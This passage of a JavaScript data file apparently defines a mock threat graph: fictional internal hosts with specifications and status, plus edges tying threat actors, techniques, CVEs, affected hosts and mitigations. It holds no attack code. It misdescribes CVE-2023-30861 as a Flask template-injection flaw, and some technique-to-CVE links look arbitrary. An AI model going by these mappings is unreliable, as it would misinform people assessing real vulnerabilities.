        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Storage Services Subnet',
        availableTools: 'mc (minio-client), occ, zfs',
        dependencies: 'zfs-utils, openssl 3.2'
      }
    },
    {
      id: 'Computer 17',
      properties: {
        label: 'Software',
        name: 'Computer 17',
        hostname: 'BANK-COMP-17',
        application: 'Banking Ledger Application',
        technology: 'Java / Quarkus Financial',
        os: 'Rocky Linux 9.3',
        version: 'Rocky Linux 9.3',
        cpu: '8 vCPU AMD EPYC',
        ram: '32 GB ECC DDR5',
        storage: '500 GB Encrypted NVMe',
        installedSoftware: 'Quarkus 3.8.1, GraalVM JDK 21, HSM PKCS#11',
        softwareVersions: 'Quarkus 3.8.1, Java 21',
        purpose: 'High-assurance double-entry financial ledger and audit ledger',
        port: 8444,
        ip: '192.168.10.117',
        service: 'banking-ledger.service',
        configFile: 'ledger.properties',
        configPath: '/opt/banking/config/ledger.properties',
        status: 'HEALTHY',
        securityStatus: 'SECURE - HSM Protected',
        vulnerabilityStatus: 'NONE',
        environment: 'Financial Settlement Tier',
        availableTools: 'pkcs11-tool, java, curl',
        dependencies: 'libcrypto, opensc, glibc 2.34'
      }
    },
    {
      id: 'Computer 18',
      properties: {
        label: 'Software',
        name: 'Computer 18',
        hostname: 'NOTIF-COMP-18',
        application: 'Notification Service',
        technology: 'Node.js / Express',
        os: 'Alpine Linux 3.19',
        version: 'Alpine 3.19',
        cpu: '2 vCPU Intel Xeon',
        ram: '4 GB DDR4',
        storage: '60 GB SSD',
        installedSoftware: 'Node.js 20.11.1, npm 10.2, BullMQ, Redis Client',
        softwareVersions: 'Node.js 20.11.1',
        purpose: 'Dispatches transactional emails, SMS alerts, and push notifications',
        port: 3001,
        ip: '192.168.10.118',
        service: 'notification-worker.service',
        configFile: 'notifier.json',
        configPath: '/opt/notifier/config.json',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Communications Worker Tier',
        availableTools: 'pm2, node, curl',
        dependencies: 'musl, libuv 1.48'
      }
    },
    {
      id: 'Computer 19',
      properties: {
        label: 'Software',
        name: 'Computer 19',
        hostname: 'HLTH-COMP-19',
        application: 'Healthcare Patient Portal',
        technology: 'FHIR API / Node.js',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 LTS',
        cpu: '6 vCPU AMD Ryzen',
        ram: '16 GB DDR5',
        storage: '250 GB NVMe',
        installedSoftware: 'HAPI FHIR Gateway 6.10, Node.js 20.12, TLS 1.3',
        softwareVersions: 'FHIR 4.0.1, Node 20.12',
        purpose: 'HIPAA-compliant patient telemetry and medical diagnostic exchange',
        port: 8445,
        ip: '192.168.10.119',
        service: 'fhir-portal.service',
        configFile: 'fhir.config.js',
        configPath: '/etc/fhir/fhir.config.js',
        status: 'HEALTHY',
        securityStatus: 'SECURE - HIPAA Compliant',
        vulnerabilityStatus: 'NONE',
        environment: 'HIPAA Secure Clinical Zone',
        availableTools: 'curl, openssl, auditd',
        dependencies: 'openssl 3.2, glibc 2.39'
      }
    },
    {
      id: 'Computer 20',
      properties: {
        label: 'Software',
        name: 'Computer 20',
        hostname: 'IOT-COMP-20',
        application: 'IoT Sensor Ingestion Gateway',
        technology: 'Mosquitto MQTT / C++',
        os: 'Debian GNU/Linux 12',
        version: 'Debian 12',
        cpu: '4 vCPU ARM64 / Neoverse',
        ram: '8 GB LPDDR5',
        storage: '128 GB eMMC/SSD',
        installedSoftware: 'Eclipse Mosquitto 2.0.18, libwebsockets, C++20 daemons',
        softwareVersions: 'Mosquitto 2.0.18',
        purpose: 'Ingests environmental sensors, temperature telemetry, and PLC alerts',
        port: 1883,
        ip: '192.168.10.120',
        service: 'mosquitto.service',
        configFile: 'mosquitto.conf',
        configPath: '/etc/mosquitto/mosquitto.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Edge OT & Sensor Network',
        availableTools: 'mosquitto_sub, mosquitto_pub, htop',
        dependencies: 'libssl3, libc6 2.36'
      }
    },
    {
      id: 'Computer 21',
      properties: {
        label: 'Software',
        name: 'Computer 21',
        hostname: 'API-COMP-21',
        application: 'Internal Analytics API',
        technology: 'Python / Flask',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 LTS (Kernel 6.8)',
        cpu: '6 vCPU AMD EPYC 7763',
        ram: '16 GB DDR5',
        storage: '250 GB NVMe SSD',
        installedSoftware: 'Python 3.11.8, Flask 2.2.5, Werkzeug 2.2.3, Jinja2 3.1.2, Gunicorn 21.2',
        softwareVersions: 'Python 3.11.8, Flask 2.2.5, Jinja2 3.1.2',
        purpose: 'Internal metrics reporting, business intelligence queries, and chart data API',
        port: 5000,
        ip: '192.168.10.121',
        service: 'analytics-api.service',
        configFile: 'gunicorn.conf.py',
        configPath: '/etc/analytics/gunicorn.conf.py',
        status: 'COMPROMISED',
        threat: 'Python Application Vulnerability (Server-Side Template Injection)',
        affectedComponent: 'Flask Analytics Engine (analytics_report_generator.py)',
        securityStatus: 'COMPROMISED - Active SSTI Execution Vector',
        vulnerabilityStatus: 'CVE-2023-30861',
        environment: 'Corporate Analytics Tier',
        availableTools: 'gunicorn, pip, python3, pytest',
        dependencies: 'flask 2.2.5, jinja2 3.1.2, werkzeug 2.2.3',
        associatedLogs: [
          'WARN [gunicorn] Template evaluation syntax error on /api/analytics/report',
          'ALERT [auditd] Privilege escalation attempt detected by user flask_app',
          'CRITICAL [monitor] Code injection detected on host API-COMP-21'
        ],
        associatedBugs: ['CVE-2023-30861']
      }
    },
    {
      id: 'Computer 22',
      properties: {
        label: 'Software',
        name: 'Computer 22',
        hostname: 'ADMIN-COMP-22',
        application: 'Internal Admin Application',
        technology: 'React Admin / Node.js',
        os: 'Debian GNU/Linux 12',
        version: 'Debian 12',
        cpu: '4 vCPU Intel Core',
        ram: '8 GB DDR4',
        storage: '150 GB SSD',
        installedSoftware: 'Node.js 20.12, Nginx 1.24, Vite 5.1, React 18',
        softwareVersions: 'Node.js 20.12, React 18.2',
        purpose: 'Staff backoffice control panel, feature flags, and tenant administration',
        port: 3002,
        ip: '192.168.10.122',
        service: 'admin-portal.service',
        configFile: 'admin.conf',
        configPath: '/etc/nginx/sites-available/admin.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Internal Staff Operations',
        availableTools: 'pm2, npm, nginx -t',
        dependencies: 'glibc 2.36, openssl 3.0'
      }
    },
    {
      id: 'Computer 23',
      properties: {
        label: 'Software',
        name: 'Computer 23',
        hostname: 'ETL-COMP-23',
        application: 'Data Warehouse & ETL',
        technology: 'ClickHouse / OLAP',
        os: 'Rocky Linux 9.3',
        version: 'Rocky Linux 9.3',
        cpu: '16 vCPU AMD EPYC',
        ram: '64 GB ECC DDR5',
        storage: '2 TB NVMe RAID0',
        installedSoftware: 'ClickHouse 24.2.1, Vector 0.36, Apache Arrow',
        softwareVersions: 'ClickHouse 24.2.1',
        purpose: 'High-speed columnar analytics, event aggregation, and BI warehousing',
        port: 8123,
        ip: '192.168.10.123',
        service: 'clickhouse-server.service',
        configFile: 'config.xml',
        configPath: '/etc/clickhouse-server/config.xml',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Analytics Big Data Tier',
        availableTools: 'clickhouse-client, clickhouse-benchmark',
        dependencies: 'glibc 2.34, libzstd'
      }
    },
    {
      id: 'Computer 24',
      properties: {
        label: 'Software',
        name: 'Computer 24',
        hostname: 'DOCS-COMP-24',
        application: 'Documentation System',
        technology: 'MkDocs / Nginx',
        os: 'Alpine Linux 3.19',
        version: 'Alpine 3.19',
        cpu: '2 vCPU Intel Xeon',
        ram: '4 GB DDR4',
        storage: '50 GB SSD',
        installedSoftware: 'Nginx 1.25.4, MkDocs Material 9.5, Python 3.11',
        softwareVersions: 'Nginx 1.25.4, MkDocs 9.5',
        purpose: 'Engineering knowledge base, architecture diagrams, and API docs',
        port: 8082,
        ip: '192.168.10.124',
        service: 'docs-server.service',
        configFile: 'mkdocs.conf',
        configPath: '/etc/nginx/conf.d/docs.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Internal Developer Portal',
        availableTools: 'mkdocs, git, nginx',
        dependencies: 'musl libc, openssl'
      }
    },
    {
      id: 'Computer 25',
      properties: {
        label: 'Software',
        name: 'Computer 25',
        hostname: 'DC-COMP-25',
        application: 'Identity & Domain Controller',
        technology: 'Windows Server 2022 AD DS',
        os: 'Windows Server 2022 Datacenter',
        version: 'Windows Server 2022 (Build 20348)',
        cpu: '8 vCPU Intel Xeon Platinum',
        ram: '32 GB ECC DDR4',
        storage: '500 GB SAS RAID10',
        installedSoftware: 'Active Directory Domain Services, Kerberos KDC, DNS Server, Sysmon',
        softwareVersions: 'Windows Server 2022 Build 20348, AD DS',
        purpose: 'Active Directory root domain controller, Kerberos auth, and Group Policy',
        port: 389,
        ip: '192.168.10.125',
        service: 'NTDS',
        configFile: 'ntds.dit',
        configPath: 'C:\\Windows\\NTDS\\ntds.dit',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Domain Controller Enforced',
        vulnerabilityStatus: 'NONE',
        environment: 'Core Infrastructure Domain Zone',
        availableTools: 'PowerShell, RSAT, Active Directory Administrative Center, dcdiag',
        dependencies: 'Active Directory Database Engine, Kerberos V5'
      }
    },
    {
      id: 'Computer 26',
      properties: {
        label: 'Software',
        name: 'Computer 26 (Payment Gateway)',
        hostname: 'PAY-GATEWAY-26',
        application: 'Payment Gateway',
        technology: 'Node.js / Express',
        os: 'Ubuntu 22.04 LTS',
        version: 'Ubuntu 22.04 LTS',
        cpu: '4 vCPU AMD EPYC',
        ram: '16 GB DDR4',
        storage: '128 GB NVMe SSD',
        installedSoftware: 'Node.js v20.11.0, Express 4.19, OpenSSL 3.0.2',
        softwareVersions: 'Node.js 20, Express 4.19',
        purpose: 'Payment Gateway service executing financial transaction settlement',
        port: 8443,
        ip: '192.168.10.126',
        service: 'computer-26-daemon.service',
        configFile: 'payment_gateway.conf',
        configPath: '/etc/payment/service.json',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Production PCI-DSS Cardholder Data Environment',
        availableTools: 'systemctl, journalctl, curl, netstat',
        dependencies: 'node v20, express, openssl 3.0'
      }
    },
    {
      id: 'Computer 27',
      properties: {
        label: 'Software',
        name: 'Computer 27 (Analytics Engine)',
        hostname: 'ANALYTICS-COMP-27',
        application: 'Big Data Analytics Engine',
        technology: 'Apache Spark / Hadoop',
        os: 'Ubuntu 22.04 LTS',
        version: 'Ubuntu 22.04',
        cpu: '16 vCPU Intel Xeon',
        ram: '64 GB DDR4 ECC',
        storage: '2 TB NVMe RAID0',
        installedSoftware: 'Apache Spark 3.5, Hadoop 3.3.6, OpenJDK 17',
        softwareVersions: 'Spark 3.5, Java 17',
        purpose: 'Near-real-time payment fraud analytics and batch settlement processing',
        port: 8088,
        ip: '192.168.10.127',
        service: 'spark-master.service',
        configFile: 'spark-defaults.conf',
        configPath: '/opt/spark/conf/spark-defaults.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Enterprise Analytics Enclave',
        availableTools: 'spark-shell, spark-submit, hdfs',
        dependencies: 'OpenJDK 17, Hadoop native libs'
      }
    },
    {
      id: 'Computer 28',
      properties: {
        label: 'Software',
        name: 'Computer 28 (Edge API Gateway)',
        hostname: 'INGRESS-COMP-28',
        application: 'Edge API Gateway',
        technology: 'Kong / Envoy Proxy',
        os: 'Alpine Linux 3.19',
        version: 'Alpine 3.19',
        cpu: '8 vCPU AMD EPYC',
        ram: '16 GB DDR4',
        storage: '100 GB NVMe',
        installedSoftware: 'Kong Gateway 3.6, Envoy 1.29, OpenSSL 3.1',
        softwareVersions: 'Kong 3.6, Envoy 1.29',
        purpose: 'Edge TLS termination, rate limiting, and zero-trust mutual TLS gateway',
        port: 443,
        ip: '192.168.10.128',
        service: 'kong-gateway.service',
        configFile: 'kong.conf',
        configPath: '/etc/kong/kong.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Edge DMZ Ingress Layer',
        availableTools: 'kong health, curl, netstat, tcpdump',
        dependencies: 'OpenResty, LuaJIT, OpenSSL'
      }
    }
  ],

  edges: [
    // Threat Actor to Malware
    { from: 'APT29', to: 'WellMess', label: 'USES' },
    { from: 'FIN7', to: 'Carbanak', label: 'USES' },

    // Malware to Technique
    { from: 'WellMess', to: 'T1059', label: 'USES' },
    { from: 'Carbanak', to: 'T1059', label: 'USES' },

    // Threat Actor direct to Technique (multi-vector branching)
    { from: 'APT29', to: 'T1190', label: 'USES' },
    { from: 'FIN7', to: 'T1190', label: 'USES' },
    { from: 'Sandworm', to: 'T1190', label: 'USES' },
    { from: 'Lazarus', to: 'T1078', label: 'USES' },

    // Technique to Active Vulnerabilities
    { from: 'T1190', to: 'CVE-2023-39417', label: 'EXPLOITS' },
    { from: 'T1059', to: 'CVE-2021-44228', label: 'EXPLOITS' },
    { from: 'T1078', to: 'CVE-2023-30861', label: 'EXPLOITS' },

    // Vulnerabilities to Affected Production Workloads
    { from: 'CVE-2023-39417', to: 'Computer 07', label: 'AFFECTS' },
    { from: 'CVE-2021-44228', to: 'Computer 14', label: 'AFFECTS' },
    { from: 'CVE-2023-30861', to: 'Computer 21', label: 'AFFECTS' },

    // Mitigations
    { from: 'CVE-2023-39417', to: 'Mitigation-SQL-07', label: 'HAS_MITIGATION' },
    { from: 'CVE-2021-44228', to: 'Mitigation-Java-14', label: 'HAS_MITIGATION' },
    { from: 'CVE-2023-30861', to: 'Mitigation-Python-21', label: 'HAS_MITIGATION' }
  ]
};
